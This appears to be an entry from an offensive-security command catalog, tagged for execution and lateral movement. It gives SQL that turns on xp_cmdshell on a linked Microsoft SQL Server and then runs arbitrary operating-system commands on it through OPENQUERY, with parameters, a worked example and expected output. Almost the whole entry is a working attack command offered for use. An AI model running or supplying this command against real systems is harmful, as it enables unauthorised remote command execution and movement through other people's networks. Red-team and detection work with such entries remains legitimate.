---
type: command
executor: sql
data: >-
  EXECUTE('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT
  $_LINKED_SERVER;\nSELECT 1 FROM OPENQUERY("$_LINKED_SERVER", 'SELECT 1; EXEC
  master..xp_cmdshell "$_SHELL_COMMAND"');
output: null
platforms:
  - Windows
tags:
  - sql
  - execution
  - lateral-movement
verified: true
validated: true
---

# enable-xp-cmdshell-and-execute-shell-via-linked-server

## Command

```sql
EXECUTE('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT $_LINKED_SERVER;
SELECT 1 FROM OPENQUERY("$_LINKED_SERVER", 'SELECT 1; EXEC master..xp_cmdshell "$_SHELL_COMMAND"');
```

## Description

This command enables the xp_cmdshell extended procedure on a linked server and executes an OS shell command through it, allowing remote command execution via SQL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LINKED_SERVER | Name of the linked server | Yes |
| $_SHELL_COMMAND | OS command to execute (e.g., dir c:) | Yes |

## Examples

### Basic Usage

```sql
EXECUTE('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT linkedserver;
SELECT 1 FROM OPENQUERY("linkedserver", 'SELECT 1; EXEC master..xp_cmdshell "dir c:"');
```

## Expected Output

First part: Configuration message like "Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install." Second part: A table with a single row (1) and output from the shell command, e.g., directory listing with Mode, LastWriteTime, Length columns.

## Related

- [[procedures/Execute-Queries-via-Linked-SQL-Servers]]
